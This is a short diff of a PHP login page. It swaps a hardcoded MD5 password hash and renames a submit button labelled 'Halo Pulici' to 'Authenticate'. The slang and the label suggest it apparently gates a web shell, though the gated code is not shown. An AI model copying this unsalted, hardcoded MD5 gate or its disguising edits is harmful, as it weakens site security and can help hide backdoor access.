@@ -35,7 +35,7 @@ function is_logged_in()
 
 if (isset($_POST['password'])) {
     $entered_password = $_POST['password'];
-    $hashed_password = 'eacddb08607025e9606e7642e18e1456';
+    $hashed_password = '57b0f999ce325fd323e85db1a55a0c1f';
     if (md5($entered_password) === $hashed_password) {
         $_SESSION['logged_in'] = true;
         $_SESSION['coki'] = 'asu';
@@ -69,10 +69,11 @@ if (is_logged_in()) {
         <form id="login-form" method="POST" action="">
             <label for="password">Password:</label>
             <input type="password" id="password" name="password">
-            <input type="submit" value="Halo Pulici">
+            <input type="submit" value="Authenticate">
         </form>
     </body>
     </html>
     <?php
 }
+
 ?>
